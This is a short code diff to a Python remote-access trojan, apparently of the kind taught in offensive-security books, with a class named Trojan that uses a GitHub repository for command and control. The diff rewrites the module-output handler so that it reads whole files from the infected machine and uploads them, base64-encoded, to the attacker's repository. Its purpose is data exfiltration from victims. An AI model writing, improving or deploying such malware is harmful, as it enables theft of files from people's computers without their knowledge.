@@ -7,6 +7,7 @@ import sys
 import threading
 import time
 from datetime import datetime
+import os
 
 def github_connect():
     with open('secret.txt') as f:
@@ -34,13 +35,19 @@ class Trojan:
         return config
 
     def module_runner(self, module):
-        result = sys.modules[module].run()
-        self.store_module_result(result)
+        # Run the module and get the path to the file it returns
+        file_path = sys.modules[module].run()
+        self.store_file(file_path)
 
-    def store_module_result(self, data):
-        message = datetime.now().isoformat()
-        remote_path = f'data/{self.id}/{message}.data'
-        bindata = base64.b64encode(bytes('%r' % data, 'utf-8'))
+    def store_file(self, file_path):
+        with open(file_path, 'rb') as file:
+            file_data = file.read()
+
+        bindata = base64.b64encode(file_data)
+        message = f"Module output from {datetime.now().isoformat()}"
+        remote_path = f'data/{self.id}/{os.path.basename(file_path)}'
+        
+        # Upload the file to the GitHub repository
         self.repo.create_file(remote_path, message, bindata)
 
     def run(self):
